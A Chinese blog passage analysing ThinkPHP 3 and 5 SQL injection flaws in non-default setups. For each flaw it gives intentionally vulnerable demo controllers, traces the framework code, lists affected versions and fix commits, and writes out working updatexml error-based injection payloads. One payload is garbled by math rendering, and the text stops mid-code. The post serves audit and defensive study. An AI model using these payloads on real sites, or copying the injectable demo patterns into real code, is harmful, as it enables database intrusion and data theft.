    <content type="html"><![CDATA[<h1 id="0x00-序"><a class="markdownIt-Anchor" href="#0x00-序"></a> 0x00 序</h1><p>上面我们分析了TP框架存在的默认漏洞，此篇分析一下非默认环境下的漏洞，可能主要包括：</p><ol><li>某些内置函数本身存在问题，在代码审计时可结合利用</li><li>框架非默认情况下的漏洞，实战更多可能做权限维持</li></ol><h1 id="0x01-tp3"><a class="markdownIt-Anchor" href="#0x01-tp3"></a> 0x01 TP3</h1><h2 id="一-sql-注入"><a class="markdownIt-Anchor" href="#一-sql-注入"></a> 一、 SQL 注入</h2><h3 id="10-tp过滤策略"><a class="markdownIt-Anchor" href="#10-tp过滤策略"></a> 1.0 TP过滤策略</h3><p>I 方法在TP3中是获取参数的，默认会存在过滤规则</p><ol><li>callback调用defalt_filter</li></ol><p><img src="../../../typora-user-images/image-20240816173930602.png" alt="image-20240816173930602" /></p><p>实体编码，防xss</p><p><img src="../../../typora-user-images/image-20240816174206494.png" alt="image-20240816174206494" /></p><ol start="2"><li>callback调用think_fiter</li></ol><p><img src="../../../typora-user-images/image-20240816174457328.png" alt="image-20240816174457328" /></p><p>SQL注入过滤特殊字符</p><p><img src="../../../typora-user-images/image-20240816174544180.png" alt="image-20240816174544180" /></p><ol start="3"><li>SQL操作类，定义了过滤函数，特殊字符增加转义。（TP默认使用非GBK，因此也避免了字符型注入的拼接问题）</li></ol><p><img src="../../../typora-user-images/image-20240902161421793.png" alt="image-20240902161421793" /></p><h3 id="11-find方法where注入️24"><a class="markdownIt-Anchor" href="#11-find方法where注入️24"></a> 1.1 find方法+where注入（❤️.2.4）</h3><h4 id="vuldemo"><a class="markdownIt-Anchor" href="#vuldemo"></a> VulDemo</h4><ul><li>find函数参数可控</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.Sno'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h4><p>version&lt;=3.2.3</p><h4 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h4><p><strong>网上很多分析文章都把这个洞叫做where注入，这样起名感觉有点误导的感觉。</strong></p><p><strong>漏洞发生在find参数可控时，其实就是当参数为数组时，且数组键值存在where，最后构造sql的时候，就会把这个键值拼接到where语句中，导致SQL注入。叫where注入也没什么问题，但是不是tp处理sql的那个where函数</strong></p><p>codeDemo：</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">class IndexController extends Controller&#123;    public function index()    &#123;        $data &#x3D; M(&#39;Student&#39;)-&gt;find(I(&#39;GET.Sno&#39;));        var_dump($data);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>跟入find函数</li></ol><p>\Think\Model::find</p><p><img src="../../../typora-user-images/image-20240830181613202.png" alt="image-20240830181613202" /></p><ol start="2"><li>找到最终执行SQL的地方</li></ol><p><img src="../../../typora-user-images/image-20240902163234596.png" alt="image-20240902163234596" /></p><ol start="3"><li>再往里面跟</li></ol><p><img src="../../../typora-user-images/image-20240902163408392.png" alt="image-20240902163408392" /></p><p><img src="../../../typora-user-images/image-20240902163417366.png" alt="image-20240902163417366" /></p><p><img src="../../../typora-user-images/image-20240902163431277.png" alt="image-20240902163431277" /></p><p><img src="../../../typora-user-images/image-20240902163459000.png" alt="image-20240902163459000" /></p><p>总结一下就是会拼接where的部分到SQL语句中。</p><ol start="4"><li>所以重点在option数组的where键值在哪</li></ol><p>看一下这里的赋值部分。</p><p><img src="../../../typora-user-images/image-20240902163732464.png" alt="image-20240902163732464" /></p><ol start="5"><li>跟入图中的函数</li></ol><p>找到可能影响option赋值的地方（因为我们函数传入的参数是最开始的option）</p><p><img src="../../../typora-user-images/image-20240902163901971.png" alt="image-20240902163901971" /></p><p>分析一下这里的if条件，首先where肯定要赋值的，第二处where的值不是数组（是我们传入的sql注入payload），因此整个过程中options的where的值不会变。</p><p>因此整个漏洞利用过程就很清晰了，我们赋值的时候选择赋值数组，然后插入SQL注入payload即可。</p><p>Sno[where]=1 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)%23</p><p><img src="../../../typora-user-images/image-20240902164834951.png" alt="image-20240902164834951" /></p><p><img src="../../../typora-user-images/image-20240902164651970.png" alt="image-20240902164651970" /></p><p>整个利用完成。</p><p>我们正常传参Sno=1时的opions数组：</p><p><img src="../../../typora-user-images/image-20240902164736931.png" alt="image-20240902164736931" /></p><h4 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复"></a> 漏洞修复</h4><p><a href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04</a></p><p><img src="../../../typora-user-images/image-20240902165021921.png" alt="image-20240902165021921" /></p><p>重点在圈出来的部分，之前获取options的时候是操作原始函数参数的，更新后不操作原始参数了，漏洞也就不存在了。</p><h3 id="12-where方法exp注入全版本"><a class="markdownIt-Anchor" href="#12-where方法exp注入全版本"></a> 1.2 where方法+exp注入（全版本）</h3><h4 id="vuldemo-2"><a class="markdownIt-Anchor" href="#vuldemo-2"></a> VulDemo</h4><ul><li>where参数可控</li><li>结合find函数</li><li>不使用tp自带的I函数获取参数</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$no</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span> <span class="token operator">=></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$no</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-2"><a class="markdownIt-Anchor" href="#影响版本-2"></a> 影响版本</h4><p>未修复，但需要不使用TP的I函数获取参数</p><h4 id="漏洞分析-2"><a class="markdownIt-Anchor" href="#漏洞分析-2"></a> 漏洞分析</h4><ol><li>where来获取参数</li></ol><p><img src="../../../typora-user-images/image-20240902180246363.png" alt="image-20240902180246363" /></p><ol start="2"><li>漏洞触发点还是在find函数，解析where的部分。</li></ol><p><img src="../../../typora-user-images/image-20240902180718410.png" alt="image-20240902180718410" /></p><ol start="3"><li>重点在这里，当数据第一个值为exp时，where会直接拼接第数组第二个值</li></ol><p><img src="../../../typora-user-images/image-20240902180958738.png" alt="image-20240902180958738" /></p><p><img src="../../../typora-user-images/image-20240902181103234.png" alt="image-20240902181103234" /></p><h4 id="漏洞修复-2"><a class="markdownIt-Anchor" href="#漏洞修复-2"></a> 漏洞修复</h4><p>使用TP自带的I函数获取参数即可（I函数会callback过滤一些关键字）</p><h3 id="13-where方法bind注入️25"><a class="markdownIt-Anchor" href="#13-where方法bind注入️25"></a> 1.3 where方法+bind注入（❤️.2.5）</h3><h4 id="vuldemo-3"><a class="markdownIt-Anchor" href="#vuldemo-3"></a> VulDemo</h4><ul><li>where参数可控</li><li>结合save使用</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-3"><a class="markdownIt-Anchor" href="#影响版本-3"></a> 影响版本</h4><p>TP&lt;=3.2.4</p><h4 id="漏洞分析-3"><a class="markdownIt-Anchor" href="#漏洞分析-3"></a> 漏洞分析</h4><p>触发方式与上面类似</p><ol><li>先看一下save方法都做了什么</li></ol><p>其实就是update更新了数据库</p><p><img src="../../../typora-user-images/image-20240905175748013.png" alt="image-20240905175748013" /></p><ol start="2"><li>跟入update方法</li></ol><p>这里的options与上面分析的相同，是我们传入的参数</p><p><img src="../../../typora-user-images/image-20240905175854513.png" alt="image-20240905175854513" /></p><ol start="3"><li>跟入这里的parseBind方法</li></ol><p>会取值赋值到bind</p><p><img src="../../../typora-user-images/image-20240905175953825.png" alt="image-20240905175953825" /></p><ol start="4"><li>看会update方法，跟入下发的parseSet方法</li></ol><p><img src="../../../typora-user-images/image-20240905180155824.png" alt="image-20240905180155824" /></p><ol start="5"><li>跟入这里的bindParam方法</li></ol><p><img src="../../../typora-user-images/image-20240905180242499.png" alt="image-20240905180242499" /></p><ol start="6"><li>重新处理了bind的值，增加了：</li></ol><p><img src="../../../typora-user-images/image-20240905180305467.png" alt="image-20240905180305467" /></p><ol start="7"><li>继续往下看，看到parseWhere方法</li></ol><p><img src="../../../typora-user-images/image-20240905181047505.png" alt="image-20240905181047505" /></p><ol start="8"><li>跟入里面的parseWhereItem方法</li></ol><p><img src="../../../typora-user-images/image-20240905181152601.png" alt="image-20240905181152601" /></p><ol start="9"><li>当表达式bind时，会拼接key:=value</li></ol><p><img src="../../../typora-user-images/image-20240905181250449.png" alt="image-20240905181250449" /></p><ol start="10"><li>看会update执行的execute方法</li></ol><p><img src="../../../typora-user-images/image-20240905181339548.png" alt="image-20240905181339548" /></p><ol start="11"><li>很明显会走入图中的逻辑</li></ol><p><img src="../../../typora-user-images/image-20240905181429181.png" alt="image-20240905181429181" /></p><p>这里面有个字符串替换方法</p><p>就是把this—&gt;bind里面的key value对应关系，直接替换到str里面。</p><p>（这里的callback写的看起来很难受，实际可以直接忽略，实际上就是做了特殊字符转义，我们直接去掉看就可以）</p><p>整理完整个流程了。</p><p>我们传参数尝试一下，看看可能会发生什么情况。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Sno<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>bind<span class="token operator">&amp;</span>Sno<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Stu</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Student'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sno'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$Stu</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>传的data和options如下</li></ol><p><img src="../../../typora-user-images/image-20240906140832485.png" alt="image-20240906140832485" /></p><ol start="2"><li>跟到里面的bindParam函数，这里的name是0，val是传入的Sage参数的值</li></ol><p><img src="../../../typora-user-images/image-20240906141822949.png" alt="image-20240906141822949" /></p><ol start="3"><li>第二处解析parseWhere，当为bind时，会直接拼接</li></ol><p><img src="../../../typora-user-images/image-20240906142149397.png" alt="image-20240906142149397" /></p><ol start="4"><li>处理完的SQL如下，两个：就是上面两处处理的结果</li></ol><p><img src="../../../typora-user-images/image-20240906142435803.png" alt="image-20240906142435803" /></p><ol start="5"><li>跟到上面分析的第三处的函数的替换部分，会把其中的:0替换成0。这也就完成了整个sql</li></ol><p><img src="../../../typora-user-images/image-20240906142740198.png" alt="image-20240906142740198" /></p><p><img src="../../../typora-user-images/image-20240906143106502.png" alt="image-20240906143106502" /></p><p>我们发现后面的:123无法转换，导致SQL报错，123是我们传的Sno的第二个参数，解决方法也很简单，我们让Sno的第二个参数以0开始，这样替换的时候也会替换后面的:了。</p><pre class="line-numbers language-none"><code class="language-none">Sno[0]&#x3D;bind&amp;Sno[1]&#x3D;0 and updatexml(1,concat(0x7e,user(),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240906143402155.png" alt="image-20240906143402155" /></p><h4 id="漏洞修复-3"><a class="markdownIt-Anchor" href="#漏洞修复-3"></a> 漏洞修复</h4><p>在tp 3.2.5版本中</p><p><a href="https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4">https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4</a></p><p>TP的I方法获取参数添加了过滤特殊字符“bind”</p><p><img src="../../../typora-user-images/image-20240905103536028.png" alt="image-20240905103536028" /></p><h3 id="14-order方法order-by注入️24"><a class="markdownIt-Anchor" href="#14-order方法order-by注入️24"></a> 1.4 order方法+order by注入（❤️.2.4）</h3><h4 id="vuldemo-4"><a class="markdownIt-Anchor" href="#vuldemo-4"></a> VulDemo</h4><pre class="line-numbers language-none"><code class="language-none">public function index()&#123;    $User &#x3D; M(&quot;Users&quot;);    $order_by &#x3D; I(&#39;Get.name&#39;);    $q &#x3D; $User-&gt;where(&#39;id&#x3D;1&#39;)-&gt;order($order_by)-&gt;find();    $this-&gt;getSql($User);    var_dump($q);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-4"><a class="markdownIt-Anchor" href="#影响版本-4"></a> 影响版本</h4><p>TP&lt;3.2.4</p><h4 id="漏洞分析-4"><a class="markdownIt-Anchor" href="#漏洞分析-4"></a> 漏洞分析</h4><p>tp的model类默认没有order方法，在__call的魔术方法</p><p><img src="../../../typora-user-images/image-20240906144751269.png" alt="image-20240906144751269" /></p><p>parseOrder会直接将字段拼接。</p><p><img src="../../../typora-user-images/image-20240906144850165.png" alt="image-20240906144850165" /></p><h4 id="漏洞修复-4"><a class="markdownIt-Anchor" href="#漏洞修复-4"></a> 漏洞修复</h4><p>3.2.4 进行了修复</p><p><img src="../../../typora-user-images/image-20240906145044418.png" alt="image-20240906145044418" /></p><h1 id="0x02-tp5"><a class="markdownIt-Anchor" href="#0x02-tp5"></a> 0x02 TP5</h1><h2 id="一-sql注入"><a class="markdownIt-Anchor" href="#一-sql注入"></a> 一、SQL注入</h2><h3 id="1-insert方法注入013-015-10-15"><a class="markdownIt-Anchor" href="#1-insert方法注入013-015-10-15"></a> 1. insert方法注入（0.13-0.15, 1.0-1.5)</h3><h4 id="vuldemo-5"><a class="markdownIt-Anchor" href="#vuldemo-5"></a> VulDemo</h4><ul><li>开启debug</li><li>insert参数可控</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-5"><a class="markdownIt-Anchor" href="#影响版本-5"></a> 影响版本</h4><p>5.0.13&lt;=ThinkPHP&lt;=5.0.15</p><p>5.1.0&lt;=ThinkPHP&lt;=5.1.5</p><h4 id="漏洞分析-5"><a class="markdownIt-Anchor" href="#漏洞分析-5"></a> 漏洞分析</h4><ol><li>简单的生成和执行，跟到生成的部分</li></ol><p><img src="../../../typora-user-images/image-20240906175242056.png" alt="image-20240906175242056" /></p><ol start="2"><li>获取参数然后替换，生成sql</li></ol><p><img src="../../../typora-user-images/image-20240906175446473.png" alt="image-20240906175446473" /></p><ol start="3"><li>解析这部分，当值为inc、exp、dec时候，参数会进行拼接</li></ol><p><img src="../../../typora-user-images/image-20240906175600482.png" alt="image-20240906175600482" /></p><p>利用的payload：</p><pre class="line-numbers language-none"><code class="language-none">username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>这里拿mochazz师傅的图来总结了（这个图画的是真好）</strong></p><p><img src="../../../typora-user-images/image-20240906180155561.png" alt="image-20240906180155561" /></p><h4 id="漏洞修复-5"><a class="markdownIt-Anchor" href="#漏洞修复-5"></a> 漏洞修复</h4><p><img src="../../../typora-user-images/image-20240906175933493.png" alt="image-20240906175933493" /></p><h3 id="2-update方法注入16-17"><a class="markdownIt-Anchor" href="#2-update方法注入16-17"></a> 2. update方法注入（1.6-1.7）</h3><h4 id="vuldemo-6"><a class="markdownIt-Anchor" href="#vuldemo-6"></a> VulDemo</h4><ul><li>update参数可控</li><li>debug开启</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-6"><a class="markdownIt-Anchor" href="#影响版本-6"></a> 影响版本</h4><p>5.1.6&lt;=ThinkPHP&lt;=5.1.7</p><h4 id="漏洞分析-6"><a class="markdownIt-Anchor" href="#漏洞分析-6"></a> 漏洞分析</h4><ol><li>跟入到update方法</li></ol><p><img src="../../../typora-user-images/image-20240906182253139.png" alt="image-20240906182253139" /></p><ol start="2"><li>生成SQL语句和执行部分</li></ol><p><img src="../../../typora-user-images/image-20240906182504804.png" alt="image-20240906182504804" /></p><ol start="3"><li>跟入生成的sql部分，解析data和替换字符</li></ol><p><img src="../../../typora-user-images/image-20240906182603859.png" alt="image-20240906182603859" /></p><ol start="4"><li>解析data部分</li></ol><p><img src="../../../typora-user-images/image-20240906182642513.png" alt="image-20240906182642513" /></p><ol start="5"><li>这里有一个拼接的逻辑</li></ol><p><img src="../../../typora-user-images/image-20240910165958837.png" alt="image-20240910165958837" /></p><p>从上面跟下来，data是我们传的参数，可控的参数拼接成sql如下，因此最后只要符合sql要求，且第一个参数要为上面swith的point即可。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span>  <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> $a<span class="token punctuation">(</span><span class="token string">'$b($c)'</span><span class="token punctuation">)</span>  <span class="token keyword">WHERE</span>  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着我们想办法闭合即可。我们令 <strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>m</mi><mi>l</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>a</mi><mi>t</mi><mo stretchy="false">(</mo><mn>0</mn><mi>x</mi><mn>7</mn><mo separator="true">,</mo><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>0</mn><mi>x</mi><mn>7</mn><mi>e</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mo>∗</mo></msup><mo>∗</mo><mi mathvariant="normal">、</mi><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">a = updatexml(1,concat(0x7,user(),0x7e),1)^** 、 **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">7</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord cjk_fallback">、</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>b = 0</strong> 、 <strong>$c = 1</strong> ，即：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token keyword">SET</span> <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token operator">=</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token string">'0(1)'</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>继续偷mochazz师傅的图：</p><p><img src="../../../typora-user-images/image-20240910170538409.png" alt="image-20240910170538409" /></p><h4 id="漏洞修复-6"><a class="markdownIt-Anchor" href="#漏洞修复-6"></a> 漏洞修复</h4><p>直接删除了相关代码</p><p><img src="../../../typora-user-images/image-20240910170448242.png" alt="image-20240910170448242" /></p><h3 id="3-where方法exp注入全版本"><a class="markdownIt-Anchor" href="#3-where方法exp注入全版本"></a> 3. where方法exp注入（全版本）</h3><h4 id="vuldemo-7"><a class="markdownIt-Anchor" href="#vuldemo-7"></a> VulDemo</h4><ul><li>Where 第2个参数为exp</li><li>Where第3个参数可控</li><li>开启debug</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token 